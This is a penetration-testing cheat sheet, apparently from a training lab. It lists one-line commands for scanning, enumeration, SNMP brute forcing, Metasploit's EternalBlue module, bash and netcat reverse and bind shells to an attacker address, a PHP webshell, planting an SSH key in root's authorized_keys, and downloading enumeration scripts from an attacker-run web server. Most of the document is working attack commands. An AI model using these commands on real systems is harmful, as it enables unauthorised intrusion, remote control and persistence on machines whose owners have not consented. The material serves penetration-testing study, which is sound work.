General

	sudo openvpn <vpnFile>            # connect to VPN
	ifconfig/ip a                     # show ip address
	netstat -rn                       # show networks accessible via the VPN
	ssh user@10.10.10.10              # SSH to a remote server
	ftp 10.129.42.253                 # FTP to a remote server

tmux

	tmux                     # start tmux
	ctrl+b                   # tmux: default prefix
	prefix c                 # tmux: new window
	prefix 1                 # tmux: switch to window (1)
	prefix shift+%           # tmux: split pane vertically
	prefix shift+"           # tmux: split pane horizontally
	prefix ->                # tmux: switch to the right pane

VIM

	vim <file>               # vim: open file with vim
	esc+i                    # vim: enter insert mode
	esc                      # vim: back to noraml mode
	x                        # vim: cut character
	dw                       # vim: cut word
	dd                       # vim cut full line
	yw                       # vim: copy word
	yy                       # vim: copy full line
	p                        # vim: paste
	:1                       # vim: go to line number 1
	:w                       # vim: write the file 'i.e. save'
	:q                       # vim: quit
	:q!                      # vim: quit without saving
	:wq                      # vim: write and quit

Pentesting

	nmap 10.129.42.253                     # run nmap on an IP
	nmap -sV -sC -p- 10.129.42.253         # run an nmap script scan on an IP
	nmap -sT --top-ports 100 -v -oG -      # top 100 TCP ports
	locate scripts/citrix                  # list various available nmap scripts
	nmap --script smb-os-discovery.nse -p445 10.10.10.40  # run an nmap script
	netcat 10.10.10.10 22                  # grab banner of an open port
	smbclient -N -L \\\\10.129.42.253      # list smb shares
	snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0  # scan SNMP on an IP 
	onesixtyone -c dict.txt 10.129.42.254  # brute force SNMP secret string

Web Enumeration

	gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt        # run a directory scan on a website
	gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt  # run a sub-domain scan on a website
	curl -IL https://www.inlanefreight.com     # grab website banner
	whatweb 10.10.10.121                       # list details about the webserver/certs
	curl 10.10.10.121/robots.txt               # list potential directories in robots.txt
	ctrl+U                                     # view page source (in Firefox)

Public Exploits

	searchsploit openssh 7.2            # search for public eploits for a web application
	msfconsole                          # MSF: start the Metasploit Framework
	search exploit eternalblue          # MSF: search for public exploits in MSF
	use exploit/windows/smb/ms17_010_psexec  # MSF: start using an MSF module
	show options                        # MSF: show required options for an MSF module
	set RHOSTS 10.10.10.40              # MSF: set a vlue for an MSF module option
	check                               # MSF: test if the target server is vulnerable
	exploit                    # MSF: run the exploit on the target server is vulnerable

Using Shells

	nc -lvnp 1234  # start a nc listener on a local port
	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'      # send a reverse shell from the remote server
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f      # start a bind shell on the remote server
	nc 10.10.10.1 1234      # connect to a bind shell started on the remote server
	python -c 'import pty; pty.spawn("/bin/bash")'     # upgrade shell TTY(1)
	crtl+z -> stty raw -echo -> fg -> enter twice     # upgrade shell TTY(2)
	echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php     # create a webshell php file
	curl http://SERVER_IP:PORT/shell.php?cmd=id      # execute a command on an uploaded webshell

Privilege Escalation

	./linpeas.sh                      # run linpeas script to enumerate remote server
	sudo -l     # list available sudo privileges
	sudo -u user /bin/echo Hello World!     # run a command with sudo
	sudo su -     # switch to root user (if we have access to sudo su)
	sudo su user -     # switch to a user (if we have access to sudo su)
	ssh-keygen -f key     # create a new SSH key
	echo "ssh-rsa AAAAB...SNIP...M=user@parrot" >> /root/.ssh/authorized_keys     # add the generated public key to the user
	ssh root@10.10.10.10 -i key     # SSH to the server with the generated private key

Transferring Files

	python3 -m http.server 8000     # start a local webserver
	wget http://10.10.14.1:8000/linpeas.sh     # download a file on the remote server from our local machine
	curl http://10.10.14.1:8000/linenum.sh -o linenum.sh     # download a file on the remote server from our local machine
	scp linenum.sh user@remotehost:/tmp/linenum.sh     # transfer a file to the remote server with scp (requires SSH access)
	base64 shell -w 0     # convert a file to base64
	echo f0VMR...SNIO...InmDwU | base64 -d > shell     # convert a file from base64 back to its orig
	md5sum shell      # check the file's md5sum to ensure it converted correctly